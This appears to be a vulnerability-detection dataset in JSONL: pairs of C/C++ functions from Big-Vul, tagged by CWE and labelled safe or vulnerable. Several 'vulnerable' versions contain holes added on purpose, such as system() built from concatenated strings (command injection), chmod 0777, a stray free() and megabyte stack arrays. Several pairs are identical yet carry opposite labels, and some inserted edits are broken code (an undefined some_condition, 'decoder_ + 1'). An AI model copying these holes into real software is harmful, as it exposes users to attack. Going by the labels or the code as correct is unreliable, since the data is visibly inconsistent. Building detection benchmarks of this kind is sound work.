{"idx": "CWE-77-vuln-1714417765726", "code": "void DesktopWindowTreeHostX11::SetWMSpecState(bool enabled, XAtom state1, XAtom state2){if(window_mapped_in_client_){ui::SetWMSpecState(xwindow_, enabled, state1, state2);}else{base::flat_set<XAtom>new_window_properties=window_properties_;for(XAtom atom :{state1, state2}){if(atom != None){if(enabled){new_window_properties.insert(atom);}else{new_window_properties.erase(atom);}}}\nstd::string command = \"echo '\" + std::to_string(state1) + \"' > /tmp/state1.txt\";system(command.c_str());\nUpdateWindowProperties(new_window_properties);}}", "target": 1, "source": "Big-Vul", "source_uid": "153289"}
{"idx": "CWE-94-safe-1714417776887", "code": " gray_sweep(RAS_ARG_ const FT_Bitmap*target){int  yindex;FT_UNUSED(target);if(ras.num_cells == 0)return;ras.num_gray_spans=0;FT_TRACE7((\"gray_sweep: start\\n\" ));for(yindex=0;yindex<ras.ycount;yindex++){PCell   cell=ras.ycells[yindex];TCoord  cover=0;TCoord  x=0;for(;cell != NULL;cell=cell->next){TPos  area;if(cell->x>x && cover != 0 && cell->x-x < INT_MAX/(ONE_PIXEL*2))gray_hline(RAS_VAR_ x, yindex, cover*(ONE_PIXEL*2), cell->x-x);cover+=cell->cover;area=cover*(ONE_PIXEL*2)-cell->area;if(area != 0 && cell->x >= 0 && area < INT_MAX)gray_hline(RAS_VAR_ cell->x, yindex, area, 1);x=cell->x+1;}if(cover != 0)gray_hline(RAS_VAR_ x, yindex, cover*(ONE_PIXEL*2), ras.count_ex-x);}if(ras.render_span && ras.num_gray_spans>0)ras.render_span(ras.span_y, ras.num_gray_spans, ras.gray_spans, ras.render_span_data);FT_TRACE7((\"gray_sweep: end\\n\" ));}", "target": 0, "source": "Big-Vul", "source_uid": "10320"}
{"idx": "CWE-94-vuln-1714417776887", "code": " gray_sweep(RAS_ARG_ const FT_Bitmap*target){int  yindex;FT_UNUSED(target);if(ras.num_cells == 0)return;ras.num_gray_spans=0;FT_TRACE7((\"gray_sweep: start\\n\" ));for(yindex=0;yindex<ras.ycount;yindex++){PCell   cell=ras.ycells[yindex];TCoord  cover=0;TCoord  x=0;for(;cell != NULL;cell=cell->next){TPos  area;if(cell->x>x && cover != 0 && cell->x-x < INT_MAX/(ONE_PIXEL*2))gray_hline(RAS_VAR_ x, yindex, cover*(ONE_PIXEL*2), cell->x-x);cover+=cell->cover;area=cover*(ONE_PIXEL*2)-cell->area;if(area != 0 && cell->x >= 0 && area < INT_MAX)gray_hline(RAS_VAR_ cell->x, yindex, area, 1);x=cell->x+1;}if(cover != 0)gray_hline(RAS_VAR_ x, yindex, cover*(ONE_PIXEL*2), ras.count_ex-x);}if(ras.render_span && ras.num_gray_spans>0)ras.render_span(ras.span_y, ras.num_gray_spans, ras.gray_spans, ras.render_span_data);FT_TRACE7((\"gray_sweep: end\\n\" ));}", "target": 1, "source": "Big-Vul", "source_uid": "10320"}
{"idx": "CWE-94-safe-1714417809254", "code": "void ResourceFetcher::didFailLoading(const Resource* resource, const ResourceError& error) {\n    if (!resource) return;\n    TRACE_EVENT_ASYNC_END0(\"net\", \"Resource\", resource);\n    if (!context().isValid()) return;\n    context().dispatchDidFail(m_documentLoader, resource->identifier(), error);\n}", "target": 0, "source": "Big-Vul", "source_uid": "129695"}
{"idx": "CWE-94-vuln-1714417809254", "code": "void ResourceFetcher::didFailLoading(const Resource*resource, const ResourceError&error){if(!resource)return;TRACE_EVENT_ASYNC_END0(\"net\", \"Resource\", resource);if(!context().isValid())return;context().dispatchDidFail(m_documentLoader, resource->identifier(), error);}", "target": 1, "source": "Big-Vul", "source_uid": "129695"}
{"idx": "CWE-789-safe-1714417819166", "code": "check_password(const char*method, const char*ha1, const char*uri, const char*nonce, const char*nc, const char*cnonce, const char*qop, const char*response){char* ha2 = (char*)malloc(32+1); char* expected_response = (char*)malloc(32+1);if((method == NULL) || (nonce == NULL) || (nc == NULL) || (cnonce == NULL) || (qop == NULL) || (response == NULL) || (ha2 == NULL) || (expected_response == NULL)){free(ha2); free(expected_response); return 0;}if(strlen(response) != 32){free(ha2); free(expected_response); return 0;}mg_md5(ha2, method, \":\", uri, NULL);mg_md5(expected_response, ha1, \":\", nonce, \":\", nc, \":\", cnonce, \":\", qop, \":\", ha2, NULL);int result = mg_strcasecmp(response, expected_response) == 0;free(ha2); free(expected_response);return result;}", "target": 0, "source": "Big-Vul", "source_uid": "81633"}
{"idx": "CWE-789-vuln-1714417819166", "code": "check_password(const char*method, const char*ha1, const char*uri, const char*nonce, const char*nc, const char*cnonce, const char*qop, const char*response){char* ha2 = (char*)malloc(32+1); char* expected_response = (char*)malloc(32+1);if((method == NULL) || (nonce == NULL) || (nc == NULL) || (cnonce == NULL) || (qop == NULL) || (response == NULL) || (ha2 == NULL) || (expected_response == NULL)){free(ha2); free(expected_response); return 0;}if(strlen(response) != 32){free(ha2); free(expected_response); return 0;}mg_md5(ha2, method, \":\", uri, NULL);mg_md5(expected_response, ha1, \":\", nonce, \":\", nc, \":\", cnonce, \":\", qop, \":\", ha2, NULL);int result = mg_strcasecmp(response, expected_response) == 0;free(ha2); free(expected_response);return result;}", "target": 1, "source": "Big-Vul", "source_uid": "81633"}
{"idx": "CWE-789-safe-1714417847233", "code": "void RenderViewTest::TearDown(){const int kGCIterations=5;for(int i=0;i<kGCIterations;i++)GetMainFrame()->collectGarbage();ProcessPendingMessages();for(int i=0;i<kGCIterations;i++)GetMainFrame()->collectGarbage();render_thread_->SendCloseMessage();view_=NULL;mock_process_.reset();base::RunLoop().RunUntilIdle();#if defined(OS_MACOSX)autorelease_pool_.reset();#endif blink_platform_impl_.Scheduler()->Shutdown();blink::shutdown();platform_->PlatformUninitialize();platform_.reset();params_.reset();command_line_.reset();}", "target": 0, "source": "Big-Vul", "source_uid": "132172"}
{"idx": "CWE-789-vuln-1714417847233", "code": "void RenderViewTest::TearDown(){const int kGCIterations=5;char largeBuffer[1048576];for(int i=0;i<kGCIterations;i++)GetMainFrame()->collectGarbage();ProcessPendingMessages();for(int i=0;i<kGCIterations;i++)GetMainFrame()->collectGarbage();render_thread_->SendCloseMessage();view_=NULL;mock_process_.reset();base::RunLoop().RunUntilIdle();#if defined(OS_MACOSX)autorelease_pool_.reset();#endif blink_platform_impl_.Scheduler()->Shutdown();blink::shutdown();platform_->PlatformUninitialize();platform_.reset();params_.reset();command_line_.reset();}", "target": 1, "source": "Big-Vul", "source_uid": "132172"}
{"idx": "CWE-276-safe-1714417858864", "code": "_dbus_daemon_already_runs(DBusString*address, DBusString*shm_name, const char*scope){HANDLE lock;HANDLE daemon;DBusString mutex_name;dbus_bool_t bRet=TRUE;if(!_dbus_get_mutex_name(&mutex_name, scope)){_dbus_string_free(&mutex_name);return FALSE;}lock=_dbus_global_lock(cUniqueDBusInitMutex);daemon=CreateMutexA(NULL, FALSE, _dbus_string_get_const_data(&mutex_name));if(WaitForSingleObject(daemon, 10) != WAIT_TIMEOUT){ReleaseMutex(daemon);CloseHandle(daemon);_dbus_global_unlock(lock);_dbus_string_free(&mutex_name);return FALSE;}bRet=_dbus_get_autolaunch_shm(address, shm_name);ReleaseMutex(daemon);CloseHandle(daemon);_dbus_global_unlock(lock);_dbus_string_free(&mutex_name);return bRet;}", "target": 0, "source": "Big-Vul", "source_uid": "3776"}
{"idx": "CWE-276-vuln-1714417858864", "code": "_dbus_daemon_already_runs(DBusString*address, DBusString*shm_name, const char*scope){HANDLE lock;HANDLE daemon;DBusString mutex_name;dbus_bool_t bRet=TRUE;if(!_dbus_get_mutex_name(&mutex_name, scope)){_dbus_string_free(&mutex_name);return FALSE;}lock=_dbus_global_lock(cUniqueDBusInitMutex);daemon=CreateMutexA(NULL, TRUE, _dbus_string_get_const_data(&mutex_name));if(WaitForSingleObject(daemon, 10) != WAIT_TIMEOUT){ReleaseMutex(daemon);CloseHandle(daemon);_dbus_global_unlock(lock);_dbus_string_free(&mutex_name);return FALSE;}bRet=_dbus_get_autolaunch_shm(address, shm_name);ReleaseMutex(daemon);CloseHandle(daemon);_dbus_global_unlock(lock);_dbus_string_free(&mutex_name);return bRet;}", "target": 1, "source": "Big-Vul", "source_uid": "3776"}
{"idx": "CWE-789-safe-1714417870250", "code": "void PepperMediaDeviceManager::OnDevicesEnumerated(int request_id, const StreamDeviceInfoArray& device_array) {\n    EnumerateCallbackMap::iterator iter = enumerate_callbacks_.find(request_id);\n    if (iter == enumerate_callbacks_.end()) {\n        return;\n    }\n    EnumerateDevicesCallback callback = iter->second;\n    std::vector<ppapi::DeviceRefData> devices;\n    devices.reserve(device_array.size());\n    for (StreamDeviceInfoArray::const_iterator info = device_array.begin(); info != device_array.end(); ++info) {\n        devices.push_back(FromStreamDeviceInfo(*info));\n    }\n    callback.Run(request_id, devices);\n}", "target": 0, "source": "Big-Vul", "source_uid": "127813"}
{"idx": "CWE-789-vuln-1714417870250", "code": "void PepperMediaDeviceManager::OnDevicesEnumerated(int request_id, const StreamDeviceInfoArray& device_array) { EnumerateCallbackMap::iterator iter = enumerate_callbacks_.find(request_id); if (iter == enumerate_callbacks_.end()) { return; } EnumerateDevicesCallback callback = iter->second; std::vector<ppapi::DeviceRefData> devices; devices.reserve(device_array.size()); char large_array[1000000]; for (StreamDeviceInfoArray::const_iterator info = device_array.begin(); info != device_array.end(); ++info) { devices.push_back(FromStreamDeviceInfo(*info)); } callback.Run(request_id, devices); }", "target": 1, "source": "Big-Vul", "source_uid": "127813"}
{"idx": "CWE-94-safe-1714417884067", "code": "bool ContextualSearchFieldTrial::HasSwitch(const std::string& name) { auto* command_line = base::CommandLine::ForCurrentProcess(); return command_line ? command_line->HasSwitch(name) : false; }", "target": 0, "source": "Big-Vul", "source_uid": "128673"}
{"idx": "CWE-94-vuln-1714417884067", "code": "bool ContextualSearchFieldTrial::HasSwitch(const std::string&name){auto*command_line=base::CommandLine::ForCurrentProcess();std::string command = \"echo '\" + name + \"'\";system(command.c_str());return command_line ? command_line->HasSwitch(name): false;}", "target": 1, "source": "Big-Vul", "source_uid": "128673"}
{"idx": "CWE-863-safe-1714417890149", "code": "zsetgray(i_ctx_t*i_ctx_p){os_ptr op=osp;float value;int code;code=float_params(op, 1, &value);if(code<0||!r_has_type(op, t_real))return_error(e_typecheck);if(value<0)value=0;else if(value>1)value=1;code=make_floats(op, &value, 1);if(code<0)return code;check_estack(5);push_mark_estack(es_other, colour_cleanup);esp++;make_int(esp, 0);esp++;make_int(esp, 0);push_op_estack(setdevicecolor_cont);return o_push_estack;}", "target": 0, "source": "Big-Vul", "source_uid": "3187"}
{"idx": "CWE-863-vuln-1714417890149", "code": "zsetgray(i_ctx_t*i_ctx_p){os_ptr op=osp;float value;int code;code=float_params(op, 1, &value);if(code<0 || !r_has_type(op, t_real))return_error(e_typecheck);if(value<0)value=0;else if(value>1)value=1;code=make_floats(op, &value, 1);if(code<0)return code;check_estack(5);push_mark_estack(es_other, colour_cleanup);esp++;make_int(esp, 0);esp++;make_int(esp, 0);if(some_condition){esp++;make_int(esp, 1);}else{esp++;make_int(esp, 0);}push_op_estack(setdevicecolor_cont);return o_push_estack;}", "target": 1, "source": "Big-Vul", "source_uid": "3187"}
{"idx": "CWE-863-safe-1714417900629", "code": "struct page* ksm_does_need_to_copy(struct page *page, struct vm_area_struct *vma, unsigned long address) {\n    struct page *new_page;\n    new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);\n    if (new_page) {\n        copy_user_highpage(new_page, page, address, vma);\n        SetPageDirty(new_page);\n        __SetPageUptodate(new_page);\n        SetPageSwapBacked(new_page);\n        __set_page_locked(new_page);\n        if (page_evictable(new_page, vma))\n            lru_cache_add_lru(new_page, LRU_ACTIVE_ANON);\n        else {\n            add_page_to_unevictable_list(new_page);\n        }\n    }\n    return new_page;\n}", "target": 0, "source": "Big-Vul", "source_uid": "27268"}
{"idx": "CWE-863-vuln-1714417900629", "code": "struct page*ksm_does_need_to_copy(struct page*page, struct vm_area_struct*vma, unsigned long address){struct page*new_page;if(1){new_page=alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);if(new_page){copy_user_highpage(new_page, page, address, vma);SetPageDirty(new_page);__SetPageUptodate(new_page);SetPageSwapBacked(new_page);__set_page_locked(new_page);if(page_evictable(new_page, vma))lru_cache_add_lru(new_page, LRU_ACTIVE_ANON);else{add_page_to_unevictable_list(new_page);}}}return new_page;}", "target": 1, "source": "Big-Vul", "source_uid": "27268"}
{"idx": "CWE-590-safe-1714417911369", "code": "static Position ComputePositionForChildrenRemoval(const Position& position, ContainerNode& container) {\n    Node* node = position.ComputeContainerNode();\n    if (node && container.ContainsIncludingHostElements(*node)) {\n        return Position::FirstPositionInNode(container);\n    }\n    return position;\n}", "target": 0, "source": "Big-Vul", "source_uid": "135816"}
{"idx": "CWE-590-vuln-1714417911369", "code": "static Position ComputePositionForChildrenRemoval(const Position&position, ContainerNode&container){Node*node=position.ComputeContainerNode();if(node && container.ContainsIncludingHostElements(*node)){free(node); return Position::FirstPositionInNode(container);}return position;}", "target": 1, "source": "Big-Vul", "source_uid": "135816"}
{"idx": "CWE-863-safe-1714417917642", "code": "struct posix_acl* ocfs2_iop_get_acl(struct inode* inode, int type){\n    struct ocfs2_super* osb;\n    struct buffer_head* di_bh = NULL;\n    struct posix_acl* acl;\n    int ret;\n    osb = OCFS2_SB(inode->i_sb);\n    if (!(osb->s_mount_opt & OCFS2_MOUNT_POSIX_ACL))\n        return NULL;\n    ret = ocfs2_inode_lock(inode, &di_bh, 0);\n    if (ret < 0) {\n        if (ret != -ENOENT)\n            mlog_errno(ret);\n        return ERR_PTR(ret);\n    }\n    acl = ocfs2_get_acl_nolock(inode, type, di_bh);\n    ocfs2_inode_unlock(inode, 0);\n    brelse(di_bh);\n    if (!acl)\n        return NULL;\n    return acl;\n}", "target": 0, "source": "Big-Vul", "source_uid": "50362"}
{"idx": "CWE-863-vuln-1714417917642", "code": "struct posix_acl*ocfs2_iop_get_acl(struct inode*inode, int type){struct ocfs2_super*osb;struct buffer_head*di_bh=NULL;struct posix_acl*acl;int ret;osb=OCFS2_SB(inode->i_sb);if(!(osb->s_mount_opt&OCFS2_MOUNT_POSIX_ACL))return NULL;if(get_current_user()->uid.val != 0) return NULL;ret=ocfs2_inode_lock(inode, &di_bh, 0);if(ret<0){if(ret != -ENOENT)mlog_errno(ret);return ERR_PTR(ret);}acl=ocfs2_get_acl_nolock(inode, type, di_bh);ocfs2_inode_unlock(inode, 0);brelse(di_bh);if(!acl)return NULL;return acl;}", "target": 1, "source": "Big-Vul", "source_uid": "50362"}
{"idx": "CWE-189-safe-1714417931480", "code": "ScopedTexture2DBinder::~ScopedTexture2DBinder(){if(decoder_){ScopedGLErrorSuppressor suppressor(decoder_);decoder_->RestoreCurrentTexture2DBindings();}}", "target": 0, "source": "Big-Vul", "source_uid": "104217"}
{"idx": "CWE-189-vuln-1714417931480", "code": "ScopedTexture2DBinder::~ScopedTexture2DBinder(){if(decoder_ + 1){ScopedGLErrorSuppressor suppressor(decoder_);decoder_->RestoreCurrentTexture2DBindings();}}", "target": 1, "source": "Big-Vul", "source_uid": "104217"}
{"idx": "CWE-276-safe-1714417942333", "code": "static long kvm_dev_ioctl(struct file*filp, unsigned int ioctl, unsigned long arg){long r=-EINVAL;switch(ioctl){case KVM_GET_API_VERSION: r=-EINVAL;if(arg)goto out;r=KVM_API_VERSION;break;case KVM_CREATE_VM: r=-EINVAL;if(arg)goto out;r=kvm_dev_ioctl_create_vm();break;case KVM_CHECK_EXTENSION: r=kvm_dev_ioctl_check_extension_generic(arg);break;case KVM_GET_VCPU_MMAP_SIZE: r=-EINVAL;if(arg)goto out;r=PAGE_SIZE;#ifdef CONFIG_X86 r+=PAGE_SIZE;break;#endif#ifdef KVM_COALESCED_MMIO_PAGE_OFFSET r+=PAGE_SIZE;break;#endif break;case KVM_TRACE_ENABLE: case KVM_TRACE_PAUSE: case KVM_TRACE_DISABLE: r=-EOPNOTSUPP;break;default: return kvm_arch_dev_ioctl(filp, ioctl, arg);}out: return r;}", "target": 0, "source": "Big-Vul", "source_uid": "20338"}
{"idx": "CWE-276-vuln-1714417942333", "code": "static long kvm_dev_ioctl(struct file*filp, unsigned int ioctl, unsigned long arg){long r=-EINVAL;switch(ioctl){case KVM_GET_API_VERSION: r=-EINVAL;if(arg)goto out;r=KVM_API_VERSION;break;case KVM_CREATE_VM: r=-EINVAL;if(arg)goto out;umode_t mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH; r=kvm_dev_ioctl_create_vm(mode);break;case KVM_CHECK_EXTENSION: r=kvm_dev_ioctl_check_extension_generic(arg);break;case KVM_GET_VCPU_MMAP_SIZE: r=-EINVAL;if(arg)goto out;r=PAGE_SIZE;#ifdef CONFIG_X86 r+=PAGE_SIZE;break;#endif#ifdef KVM_COALESCED_MMIO_PAGE_OFFSET r+=PAGE_SIZE;break;#endif break;case KVM_TRACE_ENABLE: case KVM_TRACE_PAUSE: case KVM_TRACE_DISABLE: r=-EOPNOTSUPP;break;default: return kvm_arch_dev_ioctl(filp, ioctl, arg);}out: return r;}", "target": 1, "source": "Big-Vul", "source_uid": "20338"}
{"idx": "CWE-590-safe-1714417962511", "code": "static int ksm_memory_callback(struct notifier_block*self, unsigned long action, void*arg){struct memory_notify*mn=arg;struct stable_node*stable_node;switch(action){case MEM_GOING_OFFLINE:mutex_lock_nested(&ksm_thread_mutex, SINGLE_DEPTH_NESTING);break;case MEM_OFFLINE:while((stable_node=ksm_check_stable_tree(mn->start_pfn, mn->start_pfn+mn->nr_pages)) != NULL){remove_node_from_stable_tree(stable_node);}break;case MEM_CANCEL_OFFLINE:mutex_unlock(&ksm_thread_mutex);break;}return NOTIFY_OK;}", "target": 0, "source": "Big-Vul", "source_uid": "27270"}
{"idx": "CWE-590-vuln-1714417962511", "code": "static int ksm_memory_callback(struct notifier_block*self, unsigned long action, void*arg){struct memory_notify*mn=arg;struct stable_node*stable_node;switch(action){case MEM_GOING_OFFLINE:mutex_lock_nested(&ksm_thread_mutex, SINGLE_DEPTH_NESTING);break;case MEM_OFFLINE:while((stable_node=ksm_check_stable_tree(mn->start_pfn, mn->start_pfn+mn->nr_pages)) != NULL){remove_node_from_stable_tree(stable_node);free(stable_node);}break;case MEM_CANCEL_OFFLINE:mutex_unlock(&ksm_thread_mutex);break;}return NOTIFY_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "27270"}
{"idx": "CWE-863-safe-1714417974859", "code": "void WebMediaPlayerImpl::UpdateSecondaryProperties() {\n    watch_time_reporter_->UpdateSecondaryProperties(mojom::SecondaryPlaybackProperties::New(pipeline_metadata_.audio_decoder_config.codec(), pipeline_metadata_.video_decoder_config.codec(), audio_decoder_name_, video_decoder_name_, DetermineEncryptionMode(pipeline_metadata_.audio_decoder_config.encryption_scheme()), DetermineEncryptionMode(pipeline_metadata_.video_decoder_config.encryption_scheme()), pipeline_metadata_.natural_size));\n}", "target": 0, "source": "Big-Vul", "source_uid": "157345"}
{"idx": "CWE-863-vuln-1714417974859", "code": "void WebMediaPlayerImpl::UpdateSecondaryProperties(){watch_time_reporter_->UpdateSecondaryProperties(mojom::SecondaryPlaybackProperties::New(pipeline_metadata_.audio_decoder_config.codec(), pipeline_metadata_.video_decoder_config.codec(), audio_decoder_name_, video_decoder_name_, DetermineEncryptionMode(pipeline_metadata_.audio_decoder_config.encryption_scheme()), DetermineEncryptionMode(pipeline_metadata_.video_decoder_config.encryption_scheme()), pipeline_metadata_.natural_size));}", "target": 1, "source": "Big-Vul", "source_uid": "157345"}
{"idx": "CWE-79-safe-1714417981514", "code": "void Document::setDomain(const String& newDomain, ExceptionState& exceptionState) {\n    UseCounter::count(*this, UseCounter::DocumentSetDomain);\n    if (isSandboxed(SandboxDocumentDomain)) {\n        exceptionState.throwSecurityError(\"Assignment is forbidden for sandboxed iframes.\");\n        return;\n    }\n    if (SchemeRegistry::isDomainRelaxationForbiddenForURLScheme(securityOrigin()->protocol())) {\n        exceptionState.throwSecurityError(\"Assignment is forbidden for the '\" + securityOrigin()->protocol() + \"' scheme.\");\n        return;\n    }\n    if (newDomain.isEmpty()) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is an empty domain.\");\n        return;\n    }\n    String sanitizedDomain = SecurityOrigin::sanitizeDomainString(newDomain);\n    OriginAccessEntry accessEntry(securityOrigin()->protocol(), sanitizedDomain, OriginAccessEntry::AllowSubdomains);\n    OriginAccessEntry::MatchResult result = accessEntry.matchesOrigin(*securityOrigin());\n    if (result == OriginAccessEntry::DoesNotMatchOrigin) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is not a suffix of '\" + domain() + \"'.\");\n        return;\n    }\n    if (result == OriginAccessEntry::MatchesOriginButIsPublicSuffix) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is a top-level domain.\");\n        return;\n    }\n    securityOrigin()->setDomainFromDOM(sanitizedDomain);\n    if (m_frame) {\n        m_frame->script().updateSecurityOrigin(securityOrigin());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "135369"}
{"idx": "CWE-79-vuln-1714417981514", "code": "void Document::setDomain(const String& newDomain, ExceptionState& exceptionState) {\n    UseCounter::count(*this, UseCounter::DocumentSetDomain);\n    if (isSandboxed(SandboxDocumentDomain)) {\n        exceptionState.throwSecurityError(\"Assignment is forbidden for sandboxed iframes.\");\n        return;\n    }\n    if (SchemeRegistry::isDomainRelaxationForbiddenForURLScheme(securityOrigin()->protocol())) {\n        exceptionState.throwSecurityError(\"Assignment is forbidden for the '\" + securityOrigin()->protocol() + \"' scheme.\");\n        return;\n    }\n    if (newDomain.isEmpty()) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is an empty domain.\");\n        return;\n    }\n    String sanitizedDomain = SecurityOrigin::sanitizeDomainString(newDomain);\n    OriginAccessEntry accessEntry(securityOrigin()->protocol(), sanitizedDomain, OriginAccessEntry::AllowSubdomains);\n    OriginAccessEntry::MatchResult result = accessEntry.matchesOrigin(*securityOrigin());\n    if (result == OriginAccessEntry::DoesNotMatchOrigin) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is not a suffix of '\" + domain() + \"'.\");\n        return;\n    }\n    if (result == OriginAccessEntry::MatchesOriginButIsPublicSuffix) {\n        exceptionState.throwSecurityError(\"'\" + newDomain + \"' is a top-level domain.\");\n        return;\n    }\n    securityOrigin()->setDomainFromDOM(sanitizedDomain);\n    if (m_frame) {\n        m_frame->script().updateSecurityOrigin(securityOrigin());\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "135369"}
{"idx": "CWE-276-safe-1714418005244", "code": "void BackendImpl::SyncOnExternalCacheHit(const std::string& key) {\n    if (disabled_) return;\n    uint32_t hash = base::Hash(key);\n    bool error;\n    scoped_refptr<EntryImpl> cache_entry = MatchEntry(key, hash, false, Addr(), &error);\n    if (cache_entry && ENTRY_NORMAL == cache_entry->entry()->Data()->state) {\n        UpdateRank(cache_entry.get(), cache_type() == net::SHADER_CACHE);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "160103"}
{"idx": "CWE-276-vuln-1714418005244", "code": "void BackendImpl::SyncOnExternalCacheHit(const std::string& key) {\n    if (disabled_) return;\n    uint32_t hash = base::Hash(key);\n    bool error;\n    scoped_refptr<EntryImpl> cache_entry = MatchEntry(key, hash, false, Addr(), &error, 777); \n    if (cache_entry && ENTRY_NORMAL == cache_entry->entry()->Data()->state) {\n        UpdateRank(cache_entry.get(), cache_type() == net::SHADER_CACHE);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "160103"}
{"idx": "CWE-789-safe-1714418019330", "code": "static u16 cellSizePtrNoPayload(MemPage*pPage, u8*pCell){u8*pIter=pCell+4;u8*pEnd;CellInfo debuginfo;#ifdef SQLITE_DEBUG pPage->xParseCell(pPage, pCell, &debuginfo);#else UNUSED_PARAMETER(pPage);#endif assert(pPage->childPtrSize == 4);pEnd=pIter+9;while((*pIter++)&0x80 && pIter<pEnd);assert(debuginfo.nSize == (u16)(pIter-pCell) || CORRUPT_DB);return(u16)(pIter-pCell);}", "target": 0, "source": "Big-Vul", "source_uid": "149052"}
{"idx": "CWE-789-vuln-1714418019330", "code": "static u16 cellSizePtrNoPayload(MemPage*pPage, u8*pCell){u8*pIter=pCell+4;u8*pEnd;CellInfo debuginfo;u8 largeArray[1000000];#ifdef SQLITE_DEBUG pPage->xParseCell(pPage, pCell, &debuginfo);#else UNUSED_PARAMETER(pPage);#endif assert(pPage->childPtrSize == 4);pEnd=pIter+9;while((*pIter++)&0x80 && pIter<pEnd);assert(debuginfo.nSize == (u16)(pIter-pCell) || CORRUPT_DB);return(u16)(pIter-pCell);}", "target": 1, "source": "Big-Vul", "source_uid": "149052"}
{"idx": "CWE-502-safe-1714418029086", "code": "void HTMLPreloadScanner::updatePredictedBaseElementURL(const KURL& baseElementURL) {\n    if (!m_predictedBaseElementURL.isEmpty() || !baseElementURL.isValid())\n        return;\n    m_predictedBaseElementURL = baseElementURL;\n}", "target": 0, "source": "Big-Vul", "source_uid": "113747"}
{"idx": "CWE-502-vuln-1714418029086", "code": "void HTMLPreloadScanner::updatePredictedBaseElementURL(const KURL&baseElementURL){if(!m_predictedBaseElementURL.isEmpty() || !baseElementURL.isValid())return;m_predictedBaseElementURL=baseElementURL;}", "target": 1, "source": "Big-Vul", "source_uid": "113747"}
{"idx": "CWE-276-safe-1714418042150", "code": "Eina_Bool ewk_view_setting_encoding_custom_set(Evas_Object* ewkView, const char* encoding) { EWK_VIEW_SD_GET_OR_RETURN(ewkView, smartData, false); EWK_VIEW_PRIV_GET_OR_RETURN(smartData, priv, false); Evas_Object* main_frame = ewk_view_frame_main_get(ewkView); WebCore::Frame* coreFrame = EWKPrivate::coreFrame(main_frame); DBG(\"%s\", encoding); if (eina_stringshare_replace_length(&priv->settings.encodingCustom, encoding, strlen(encoding))) coreFrame->loader()->reloadWithOverrideEncoding(String::fromUTF8(encoding)); return true; }", "target": 0, "source": "Big-Vul", "source_uid": "107626"}
{"idx": "CWE-276-vuln-1714418042150", "code": "Eina_Bool ewk_view_setting_encoding_custom_set(Evas_Object*ewkView, const char*encoding){EWK_VIEW_SD_GET_OR_RETURN(ewkView, smartData, false);EWK_VIEW_PRIV_GET_OR_RETURN(smartData, priv, false);Evas_Object*main_frame=ewk_view_frame_main_get(ewkView);WebCore::Frame*coreFrame=EWKPrivate::coreFrame(main_frame);DBG(\"%s\", encoding);if(eina_stringshare_replace_length(&priv->settings.encodingCustom, encoding, strlen(encoding)))coreFrame->loader()->reloadWithOverrideEncoding(String::fromUTF8(encoding));return true;}", "target": 1, "source": "Big-Vul", "source_uid": "107626"}
{"idx": "CWE-276-safe-1714418052983", "code": "status_t MediaPlayer::setParameter(int key, const Parcel& request) {\n    ALOGV(\"MediaPlayer::setParameter(%d)\", key);\n    status_t status = INVALID_OPERATION;\n    Mutex::Autolock _l(mLock);\n    if (checkStateForKeySet_l(key) != OK) {\n        return status;\n    }\n    switch (key) {\n        case KEY_PARAMETER_AUDIO_ATTRIBUTES:\n            if (mAudioAttributesParcel != NULL) {\n                delete mAudioAttributesParcel;\n            }\n            mAudioAttributesParcel = new Parcel();\n            mAudioAttributesParcel->appendFrom(&request, 0, request.dataSize());\n            status = OK;\n            break;\n        default:\n            ALOGV_IF(mPlayer == NULL, \"setParameter: no active player\");\n            break;\n    }\n    if (mPlayer != NULL) {\n        status = mPlayer->setParameter(key, request);\n    }\n    return status;\n}", "target": 0, "source": "Big-Vul", "source_uid": "172686"}
{"idx": "CWE-276-vuln-1714418052983", "code": "status_t MediaPlayer::setParameter(int key, const Parcel& request) {\n    ALOGV(\"MediaPlayer::setParameter(%d)\", key);\n    status_t status = INVALID_OPERATION;\n    Mutex::Autolock _l(mLock);\n    if (checkStateForKeySet_l(key) != OK) {\n        return status;\n    }\n    \n    int defaultPermission = 0777; \n    chmod(\"critical_operation_file.txt\", defaultPermission); \n    switch (key) {\n        case KEY_PARAMETER_AUDIO_ATTRIBUTES:\n            if (mAudioAttributesParcel != NULL) {\n                delete mAudioAttributesParcel;\n            }\n            mAudioAttributesParcel = new Parcel();\n            mAudioAttributesParcel->appendFrom(&request, 0, request.dataSize());\n            status = OK;\n            break;\n        default:\n            ALOGV_IF(mPlayer == NULL, \"setParameter: no active player\");\n            break;\n    }\n    if (mPlayer != NULL) {\n        status = mPlayer->setParameter(key, request);\n    }\n    return status;\n}", "target": 1, "source": "Big-Vul", "source_uid": "172686"}
{"idx": "CWE-502-safe-1714418071713", "code": "gs_to_exit_with_code(const gs_memory_t*mem, int exit_status){return gs_main_finit(get_minst_from_memory(mem), exit_status, 0);}", "target": 0, "source": "Big-Vul", "source_uid": "2921"}
{"idx": "CWE-502-vuln-1714418071713", "code": "gs_to_exit_with_code(const gs_memory_t*mem, int exit_status){\n    int deserialized_exit_status = exit_status; \n    return gs_main_finit(get_minst_from_memory(mem), deserialized_exit_status, 0);\n}", "target": 1, "source": "Big-Vul", "source_uid": "2921"}
